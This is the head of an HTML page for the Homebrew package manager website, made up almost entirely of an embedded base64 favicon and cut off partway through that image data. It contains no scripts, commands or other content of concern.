<!DOCTYPE html><html lang=en style><head><meta charset=utf-8><title>Brew — The Missing Package Manager for macOS (or Linux)</title><meta name=viewport content="width=device-width"><meta name=referrer content=no-referrer><link rel=icon href="data:image/vnd.microsoft.icon;base64,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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMIyMjw97c2v+34v//SbX7/4vV/v+T2f//Urn8/0Cw+/9Bsfz/QbH8/0Cx/f9Asf3/QbH8/yd1qf9JT1L/8/Ly//38+/9RWFz/MIrG/8Dn//////////////////////////////38+/+kpKT/GBgYtAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMIyMjw97c2v+34///RbP8/23H/v9tx/7/RbP8/zyo8f88qPH/OaHn/zec4P83nOD/J3Wp/ztFTP/JyMj///////////9yc3L/Jm+h/8Dn///9/Pv/rq2t/4GAgP+BgID/gYCA/2BfX/waGhq8AAAAKwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMIyMjw9vZ2P+q0er/L4nG/yZvof8gWoD/IEtp/yJBV/8sQlD/N0hT/zdIU/83SFP/O0VM/8C/vv////////////////+9vLv/IkFX/6/P5P/Y1tX/JCQj0gAAAF8AAABfAAAAXwAAAEQAAAATAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAA0CQkJ21ZWVv9JT1L/UVhc/3d3d/+dnZv/uLe2/8/OzP/e3Nr/5+bm/+7u7f/u7u3/7u7t//7+/v/////////////////u7u3/b29u/0lPUv9RUVD/Dw8PygAAACMAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF85OTnliIeH/7Szs//f3t7/+fn5/////////////////////////////////////////////////////////////////////////////fz7/+Hg4P+pqan/b29u/y4uLt0AAABfAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIy4uLt3W1dP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9nX1v87OzvmAAAANAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARGZmZvj///////////////////////////////////////////7+/v////////////////////////////////////////////////////////////////////////////////+FhYT/AAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANExMTOvz8vL/////////////////////////////////ycjI/6mpqf//////////////////////vby7/7i3tv////////////////////////////////////////////////93d3f/AAAAXwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQgICJ13d3f/2NbV//n5+f//////////////////////vby7/y8vLv/JyMj////////////b2dj/ODg4/3d3d////////////////////////v7+/8zMy//S0dD/6urq/6mpqf8mJibJAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMDAwOCHh4e9MC/vv//////////////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